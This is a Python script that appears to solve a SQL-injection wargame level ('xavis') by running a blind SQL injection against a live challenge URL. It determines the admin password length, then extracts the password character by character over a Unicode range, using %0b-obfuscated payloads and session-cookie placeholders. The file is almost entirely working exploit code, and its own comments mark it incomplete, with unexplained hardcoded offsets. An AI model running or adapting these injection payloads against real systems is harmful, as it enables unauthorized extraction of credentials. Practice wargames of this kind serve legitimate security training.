#-*-coding:utf-8-*-

import requests

length = 0

url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
PHPSESSID = 'Enter your PHPSESSID'
__cfduid = 'Enter your __cfduid'

pw = "1234'%0bor%0bid='admin'%0band%0bif(MID(pw,"
middle_of_blind_sqli = ',1)%0bIN%0b(unhex(hex('
end_of_blind_sqli = '))),1,0);%0b--%0b'

true_result = '<h2>Hello admin</h2>'

answer = ''

cookie = {'PHPSESSID':PHPSESSID, '__cfduid':__cfduid}


for x in range(1, 100):
    param = "?pw=' or id='admin' and LENGTH(pw)=" + str(x) + ";%20--%20"
    new_url = url + param
    response = requests.get(new_url, cookies=cookie)

    if response.text.find(true_result) > -1:
        length = x + 1
        print("pw의 길이는 "+str(length-1))
        break

for idx in range(1, length):
    for ascii_char in range(160, 65536):
        if idx == 2 or idx == 6:
            ascii_char += 40
        param = "?pw="+pw+str(idx)+middle_of_blind_sqli+str(ascii_char)+end_of_blind_sqli
        new_url = url + param
        response = requests.get(new_url, cookies=cookie)

        if response.text.find(true_result) > -1:
            answer += str(chr(ascii_char))
            print(str(idx) + "번째 문자 : "+str(chr(ascii_char)))
            break

print("정답은 : " + answer)

response = requests.get(url+"?pw="+answer, cookies=cookie)

print(response.text)

# Blind SQL Injection using UNICODE
# 유니코드를 이용한 blind sql injection 공격

# Incomplete exploit code
# 미완성
